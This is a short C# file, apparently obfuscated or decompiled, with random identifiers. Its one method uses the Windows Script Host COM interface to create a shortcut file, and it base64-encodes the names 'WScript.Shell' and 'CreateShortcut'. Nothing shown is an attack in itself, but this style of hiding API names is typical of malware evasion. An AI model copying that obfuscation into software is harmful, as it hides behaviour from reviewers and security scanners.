using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;

namespace vQzMGKHeycFziMq;

public class HTiWbNmTwEvSjpT
{
	[ComImport]
	[TypeLibType(4160)]
	[Guid("F935DC23-1CF0-11D0-ADB9-00C04FD58A0B")]
	private interface EeyXcZoWDB
	{
		[DispId(0)]
		string kIJSxFcaKHY
		{
			[DispId(0)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
		}

		[DispId(1000)]
		string pzdVCOdgMhzUwr
		{
			[DispId(1000)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1000)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1001)]
		string XfkOusspnJsWz
		{
			[DispId(1001)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1001)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1002)]
		string URbrRJOFAjmKH
		{
			[DispId(1002)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1002)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1003)]
		string dLJYOMMJkeCVs
		{
			[DispId(1003)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1003)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1004)]
		string kNPRBbXTjjqJCtG
		{
			[DispId(1004)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1005)]
		string DKLERkVIyluS
		{
			[DispId(1005)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1005)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1006)]
		int zyyeOdHccXHT
		{
			[DispId(1006)]
			get;
			[DispId(1006)]
			[param: In]
			set;
		}

		[DispId(1007)]
		string NcCeTslKrpyYJpmnL
		{
			[DispId(1007)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1007)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[TypeLibFunc(64)]
		[DispId(2000)]
		void Load([In][MarshalAs(UnmanagedType.BStr)] string PathLink);

		[DispId(2001)]
		void Save();
	}

	private static Type dTSgkKrLQqwGLW = Type.GetTypeFromProgID(yzZnBHwSsJOOcf.jLGThbkXlozfB("V1NjcmlwdC5TaGVsbA=="));

	private static object GNEbEIIMOUZWG = Activator.CreateInstance(dTSgkKrLQqwGLW);

	public static void kkVOVbJGih(string hYHxiyTiDuyQxwh, string gFyIvustrwt, string EBULzpaTvQyK, string hBfSlztfcP, string XmYRUKwaBnSY, string kfPiyghjYIm, string ensHHAdzkcVvm)
	{
		try
		{
			EeyXcZoWDB eeyXcZoWDB = (EeyXcZoWDB)dTSgkKrLQqwGLW.InvokeMember(yzZnBHwSsJOOcf.jLGThbkXlozfB("Q3JlYXRlU2hvcnRjdXQ="), BindingFlags.InvokeMethod, null, GNEbEIIMOUZWG, new object[1] { hYHxiyTiDuyQxwh });
			eeyXcZoWDB.XfkOusspnJsWz = XmYRUKwaBnSY;
			eeyXcZoWDB.URbrRJOFAjmKH = kfPiyghjYIm;
			eeyXcZoWDB.DKLERkVIyluS = gFyIvustrwt;
			eeyXcZoWDB.NcCeTslKrpyYJpmnL = hBfSlztfcP;
			eeyXcZoWDB.pzdVCOdgMhzUwr = EBULzpaTvQyK;
			if (!string.IsNullOrEmpty(ensHHAdzkcVvm))
			{
				eeyXcZoWDB.dLJYOMMJkeCVs = ensHHAdzkcVvm;
			}
			eeyXcZoWDB.Save();
		}
		catch (Exception ex)
		{
			if (yzZnBHwSsJOOcf.dwCcrxocWgDvY)
			{
				try
				{
					File.AppendAllText(yzZnBHwSsJOOcf.HXSuIBiFjcFlYv, "Error while creating ShortCut: " + ex.Message + "\r\n");
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}
}
